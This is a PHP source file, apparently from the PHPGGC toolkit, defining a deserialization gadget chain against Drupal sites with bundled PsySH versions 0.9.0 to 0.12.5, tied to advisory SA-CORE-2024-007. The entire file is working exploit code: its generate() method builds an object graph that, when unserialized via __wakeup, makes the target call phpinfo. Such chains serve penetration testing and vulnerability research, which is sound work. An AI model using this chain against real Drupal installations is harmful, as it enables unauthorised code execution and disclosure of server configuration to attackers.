<?php

namespace GadgetChain\Drupal\PsySH;

class INFO1 extends \PHPGGC\GadgetChain\PHPInfo
{
    public static $version = '>= v0.9.0 < v0.12.6';
    public static $vector = '__wakeup';
    
    public static $author = 'mcdruid';
    public static $information = 'See: https://www.drupal.org/sa-core-2024-007
        This requires PsySH which is bundled with drush. It is common but not
        mandatory for drush to be installed along with Drupal core. Other PHP
        functions could be executed, but no parameters can be passed.';

    public function generate(array $parameters)
    {
        return (
            new \Drupal\views\ViewExecutable(
                new \Psy\ExecutionClosure('phpinfo'),
                new \Drupal\Views\DisplayPluginCollection(),
                new \Drupal\views\Plugin\views\display\DefaultDisplay()
            )
        );
    }
}